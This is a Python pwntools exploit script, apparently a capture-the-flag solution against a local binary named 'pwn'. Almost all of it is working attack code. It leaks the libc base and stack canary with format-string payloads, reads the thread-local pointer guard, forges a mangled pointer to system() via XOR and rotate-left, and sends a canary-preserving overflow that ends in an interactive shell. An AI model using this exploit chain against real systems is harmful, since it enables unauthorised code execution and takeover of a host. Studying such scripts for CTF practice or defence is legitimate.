#coding:utf-8

from pwn import *
import sys,os,string

elf_path = './pwn'
remote_libc_path = ''

#P = ELF(elf_path)
context(os='linux',arch='amd64')
context.terminal = ['tmux','split','-h']
#context.terminal = ['tmux','split','-h']
context.log_level = 'debug'

local = 1
if local == 1:
	p = process(elf_path)
	if context.arch == 'amd64':
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote()
	#libc = ELF(remote_libc_path)


def ROL(data, shift, size=64):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)


def ROR(data, shift, size=64):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)


payload = '%p'*13
sleep(0.1)
#raw_input()
p.sendline(payload)
p.recvn(14)
libcbase = int(p.recv(14),16)-libc.sym['_IO_2_1_stdin_']
log.success('libcbase = '+hex(libcbase))
p.recvuntil('7000x')
p.recvuntil('7000x')
canary = int(p.recv(16),16)
log.success('canary = '+hex(canary))

#gdb.attach(p)
gadgets = [0x4f2c5,0x4f322,0x10a38c]
shell_addr = libcbase + gadgets[0]
#tls_addr = libcbase - 0x900 + 0x30
tls_addr = libcbase + 0x816740 + 0x30
print hex(tls_addr)
fake_addr= 0x12345678
print hex(shell_addr)
payload = "%p"*6+"%s"+"%s"+p64(tls_addr)+p64(libcbase+libc.sym['environ'])
#payload = 'a'*0x38+p64(canary)+p64(0xdeadbeef)+'a'*8*240+p64(fake_addr)
#payload = payload.ljust(0x500,'a')
#gdb.attach(p,'''
#			b *(0x555555554000+0x11E0)
#			b *(0x555555554000+0x128E)
#			''')
#raw_input()
sleep(0.1)
p.sendline(payload)
p.recvuntil("0x7325732570257025")
guard = u64(p.recvn(8))
log.success("fs 0x30 guard " + hex(guard))
stack_addr = u64(p.recvn(6).ljust(8,'\x00'))
log.success("stack addr => " + hex(stack_addr))
input_addr = libcbase - 0x1150
#get shell
#raw_input()
sleep(0.1)
p.sendline(payload)
#system_enc = circular_shift_left(libcbase+libc.sym['system'],0x11,64)
system_enc = (libcbase+libc.sym['system']) ^ guard
system_enc = ROL(system_enc,0x11)

payload = p64(system_enc)+p64(libcbase+libc.search("/bin/sh").next())
payload += '\x00'*0x28
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(input_addr)*246
payload += p64(input_addr)
sleep(0.1)
#raw_input()
p.sendline(payload)

p.interactive()
